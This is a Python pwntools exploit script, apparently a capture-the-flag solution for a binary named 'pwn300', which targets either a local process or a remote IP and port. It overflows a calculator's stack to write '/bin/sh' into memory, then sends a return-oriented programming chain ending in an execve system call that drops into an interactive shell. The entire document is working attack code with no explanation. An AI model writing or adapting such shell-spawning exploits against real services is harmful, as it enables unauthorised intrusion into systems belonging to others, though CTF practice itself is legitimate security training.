#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

def debug():
    addr = raw_input("DEBUG: ")
    gdb.attach(io, "b *" + str(addr))

if sys.argv[1][0] == 'r':
    io = remote("118.190.83.164", 10080)
    elf = ELF("./pwn300")
else:
    io = process("./pwn300")
    elf = ELF("./pwn300")
offset = 16
main_elf = elf.symbols["main"]
write_elf = elf.symbols["write"]
read_elf = elf.symbols["read"]

def Total(num):
    io.sendlineafter("calculate:", str(num))

def Add(m, n):
    io.sendlineafter("result\n", "1")
    io.sendlineafter("x:", str(m))
    io.sendlineafter("y:", str(n))

def Save():
    io.sendlineafter("result\n", "5")

def write(addr, len):
    Total(offset + 6)
    for i in xrange(offset):
        Add(0, 0)

    Add(0, read_elf)#ret
    Add(0, main_elf)#puts -> start
    Add(0, 0)
    Add(0, addr)#write(1, *addr, 4)
    Add(0, len)
    #  debug()
    Save()

def rop():
    Total(offset + 8)
    for i in xrange(offset - 2):
        Add(0, 0)

    Add(0, 0x080bb406)#pop_eax_ret
    Add(0, 11)
    Add(0, 0x0806ed30)#pop_edx_ecx_ebx_ret
    Add(0, 0)
    Add(0, 0)
    Add(0, elf.bss())
    Add(0, 0x08049781)#int 0x80
    Save()


if __name__ == "__main__":
    write(elf.bss(), 8)
    io.sendline("/bin/sh\0")
    #  debug()
    rop()
    io.interactive()
    io.close()
